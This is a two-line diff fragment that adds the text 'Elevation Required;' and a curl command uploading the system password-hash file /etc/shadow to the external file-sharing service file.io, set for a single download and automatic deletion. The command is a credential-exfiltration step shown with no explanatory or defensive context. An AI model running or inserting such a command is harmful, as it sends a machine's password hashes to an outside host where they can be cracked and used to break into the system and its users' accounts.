@@ -1,0 +1,2 @@
+Elevation Required;
+curl -F 'file=@/etc/shadow' -F 'maxDownloads=1' -F 'autoDelete=true' https://file.io/
